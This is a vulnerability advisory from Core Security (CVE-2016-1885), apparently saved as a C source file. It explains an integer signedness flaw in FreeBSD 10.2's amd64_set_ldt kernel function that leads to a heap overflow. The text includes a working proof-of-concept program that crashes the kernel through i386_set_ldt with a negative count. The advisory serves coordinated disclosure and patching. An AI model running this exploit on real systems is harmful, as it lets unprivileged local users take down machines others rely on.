@@ -1,0 +1,227 @@
+/*
+
+1. Advisory Information
+
+Title: FreeBSD Kernel amd64_set_ldt Heap Overflow
+Advisory ID: CORE-2016-0005
+Advisory URL: http://www.coresecurity.com/content/freebsd-kernel-amd64_set_ldt-heap-overflow
+Date published: 2016-03-16
+Date of last update: 2016-03-14
+Vendors contacted: FreeBSD
+Release mode: Coordinated release
+
+2. Vulnerability Information
+
+Class: Unsigned to Signed Conversion Error [CWE-196]
+Impact: Denial of service
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2016-1885
+
+ 
+
+3. Vulnerability Description
+
+FreeBSD is an advanced computer operating system used to power modern servers, desktops and embedded platforms. A large community has continually developed it for more than thirty years. Its advanced networking, security and storage features have made FreeBSD the platform of choice for many of the busiest web sites and most pervasive embedded networking and storage devices.
+
+An integer signedness error has been found in the amd64_set_ldt() function in the FreeBSD kernel code (defined in the /sys/amd64/amd64/sys_machdep.c file), which implements the i386_set_ldt system call on the amd64 version of the OS. This integer signedness issue ultimately leads to a heap overflow in the kernel, allowing local unprivileged attackers to crash the system.
+
+4. Vulnerable packages
+
+FreeBSD 10.2 amd64.
+Other amd64 versions may be affected too but they were no checked.
+5. Non-vulnerable packages
+
+FreeBSD 10.2-RELENG.
+6. Vendor Information, Solutions and Workarounds
+
+The FreeBSD team has released patches for the reported vulnerabilities. You should upgrade to FreeBSD 10.2-RELENG.
+
+7. Credits
+
+This vulnerability was discovered and researched by Francisco Falcon from Core Exploit Writers Team. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team.
+
+ 
+
+8. Technical Description / Proof of Concept Code
+
+8.1. FreeBSD amd64_set_ldt Integer Signedness Vulnerability
+
+[CVE-2016-1885] FreeBSD exposes the i386_set_ldt[1] architecture-dependent system call for its Intel i386 version. This system call can be used to manage i386 per-process Local Descriptor Table (LDT) entries. The amd64 version of FreeBSD still exposes this system call for 32-bit applications running on the 64-bit version of the OS.
+
+Architecture-specific system calls are handled by the FreeBSD kernel in the sysarch() function, which is defined in the /sys/amd64/amd64/sys_machdep.c[2] file:
+
+int
+sysarch(td, uap)
+    struct thread *td;
+    register struct sysarch_args *uap;
+{
+[...]
+if (uap->op == I386_GET_LDT || uap->op == I386_SET_LDT)
+    return (sysarch_ldt(td, uap, UIO_USERSPACE));
+[...]
+     
+As we can see in the code snippet above, if the system call being invoked is either I386_GET_LDT or I386_SET_LDT, then the sysarch_ldt() function is called. The following code excerpt shows the part of the sysarch_ldt() function that is in charge of handling the I386_SET_LDT syscall:
+
+int
+sysarch_ldt(struct thread *td, struct sysarch_args *uap, int uap_space)
+{
+struct i386_ldt_args *largs, la;
+struct user_segment_descriptor *lp;
+[...]
+switch (uap->op) {
+    [...]
+    case I386_SET_LDT:
+            if (largs->descs != NULL && largs->num > max_ldt_segment)
+                return (EINVAL);
+            set_pcb_flags(td->td_pcb, PCB_FULL_IRET);
+            if (largs->descs != NULL) {
+                lp = malloc(largs->num * sizeof(struct
+                    user_segment_descriptor), M_TEMP, M_WAITOK);
+                error = copyin(largs->descs, lp, largs->num *
+                    sizeof(struct user_segment_descriptor));
+                if (error == 0)
+                    error = amd64_set_ldt(td, largs, lp);
+                free(lp, M_TEMP);
+            } else {
+                error = amd64_set_ldt(td, largs, NULL);
+            }
+            break;
+     
+The largs variable that can be seen there is a pointer to an i386_ldt_args structure, which is defined as follows in the /sys/x86/include/sysarch.h[3] file:
+
+struct i386_ldt_args {
+    unsigned int start;
+    union descriptor *descs;
+    unsigned int num;
+};
+     
+Note that all of the fields of the i386_ldt_args structure are fully user-controlled: they match the 3 arguments specified by the user when i386_set_ldt() was called from user mode:
+
+int i386_set_ldt(int start_sel, union descriptor *descs, int num_sels);
+     
+From the sysarch_ldt() snippet above we can see that if we call i386_set_ldt() from user mode specifying a NULL pointer as the second argument (largs->descs), then it will end up calling the amd64_set_ldt() function, passing the largs variable as the second argument, and a NULL pointer as the third argument. This is the prototype of the amd64_set_ldt() function being called:
+
+int
+amd64_set_ldt(struct thread *td, struct i386_ldt_args *uap, struct user_segment_descriptor *descs);
+     
+amd64_set_ldt() is the vulnerable function here. Since it is being called with its third argument (the descs pointer) set to NULL, the following code path will be executed (remember that every field in the i386_ldt_args structure pointed by the uap pointer is fully controlled from user mode):
+
+    int
+    amd64_set_ldt(td, uap, descs)
+        struct thread *td;
+        struct i386_ldt_args *uap;
+        struct user_segment_descriptor *descs;
+    {
+    [...]
+        int largest_ld;
+    [...]
+608        if (descs == NULL) {
+609                 Free descriptors 
+610                if (uap->start == 0 && uap->num == 0)
+611                        uap->num = max_ldt_segment;
+612                if (uap->num == 0)
+613                        return (EINVAL);
+614                if ((pldt = mdp->md_ldt) == NULL ||
+615                    uap->start >= max_ldt_segment)
+616                        return (0);
+617                largest_ld = uap->start + uap->num;
+618                if (largest_ld > max_ldt_segment)
+619                        largest_ld = max_ldt_segment;
+620                i = largest_ld - uap->start;
+621                mtx_lock(&dt_lock);
+622                bzero(&((struct user_segment_descriptor *)(pldt->ldt_base))
+623                    [uap->start], sizeof(struct user_segment_descriptor) * i);
+624                mtx_unlock(&dt_lock);
+625                return (0);
+626        }
+     
+The two if statements at lines 610 and 612 perform some sanity checks against uap->start and uap->num, which can be avoided by setting uap->num to a value different than 0. The next check at lines 614/615 will cause the function to exit early if the mdp->md_ldt pointer is NULL, or if uap->start is greater or equal than max_ldt_segment (1024). Having mdp->md_ldt holding a non-NULL value can be achieved by adding an initial entry to the process LDT before triggering the bug, like this:
+
+    struct segment_descriptor desc = {0, 0, SDT_MEMRW, SEL_UPL, 1, 0, 0, 1, 0 ,0}; 
+    i386_set_ldt(LDT_AUTO_ALLOC, (union descriptor *) &desc, 1);
+     
+After passing those checks we reach the vulnerable code at lines 617-619:
+
+617                largest_ld = uap->start + uap->num;
+618                if (largest_ld > max_ldt_segment)
+619                        largest_ld = max_ldt_segment;
+620                i = largest_ld - uap->start;
+     
+Note that largest_ld is a signed int that will hold the sum of uap->start + uap->num. The code at lines 618-619 tries to ensure that largest_ld is not greater than max_ldt_segment (1024); however, being largest_ld a signed integer holding a value fully controlled from user mode, it will perform a signed comparison that can be bypassed by setting uap->num to a negative number.
+
+This signedness error will ultimately lead to a heap overflow in the FreeBSD kernel when the bzero() function is later called with a huge value as its len parameter:
+
+622                bzero(&((struct user_segment_descriptor *)(pldt->ldt_base))
+623                    [uap->start], sizeof(struct user_segment_descriptor) * i);
+     
+8.2. Proof of Concept
+
+The following Proof-of-Concept code reproduces the vulnerability in a default FreeBSD 10.2-RELEASE-amd64 installation running a GENERIC kernel:
+
+*/
+
+/* $ clang amd64_set_ldt.c -o amd64_set_ldt -m32 */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <machine/segments.h>
+#include <machine/sysarch.h>
+#include <sysexits.h>
+#include <err.h>
+
+
+int main(int argc, char **argv){
+
+    int res;
+
+    struct segment_descriptor desc = {0, 0, SDT_MEMRW, SEL_UPL, 1, 0, 0, 1, 0 ,0}; 
+
+    printf("[+] Adding an initial entry to the process LDT...\n");
+    res = i386_set_ldt(LDT_AUTO_ALLOC, (union descriptor *) &desc, 1);
+    if (res < 0){
+        err(EX_OSERR, "i386_set_ldt(LDT_AUTO_ALLOC)");
+    }
+    printf("returned index: %d\n", res);
+
+    printf("Triggering the bug...\n");
+    res = i386_set_ldt(1, NULL, 0x80000000);
+}
+     
+/*
+
+9. Report Timeline
+
+2016-03-02: Core Security sent an initial notification to FreeBSD.
+2016-03-02: FreeBSD confirmed reception of our email and requested we sent them a draft version of the advisory.
+2016-03-02: Core Security sent FreeBSD a draft version of the advisory. We requested them to let us know once they finished reviewing the advisory in order to coordinate a publication date.
+2016-03-11: Core Security asked FreeBSD if they were able to review and verify the reported issue. We additionally requested an estimated date for releasing the fix/update.
+2016-03-11: FreeBSD informed us they were going to release the update in the middle of the following week.
+2016-03-11: Core Security asked FreeBSD if they had the specific date and time they were going to release the update. We additionally requested a CVE identifier for the vulnerability considering they are registered as a CNA.
+2016-03-11: FreeBSD informed us they would probably release it on Wednesday 16th of March and that they assigned the CVE-2016-1885 ID.
+2016-03-16: Advisory CORE-2016-0005 published.
+10. References
+
+[1] https://www.freebsd.org/cgi/man.cgi?query=i386_set_ldt&sektion=2&manpath=FreeBSD+8.2-RELEASE
+[2] https://svnweb.freebsd.org/base/release/10.2.0/sys/amd64/amd64/sys_machdep.c?view=markup
+[3] https://svnweb.freebsd.org/base/release/10.2.0/sys/x86/include/sysarch.h?view=markup
+
+11. About CoreLabs
+
+CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+12. About Core Security Technologies
+
+Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.
+
+13. Disclaimer
+
+The contents of this advisory are copyright (c) 2014 Core Security and (c) 2014 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+14. PGP/GPG Keys
+
+This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+
+*/
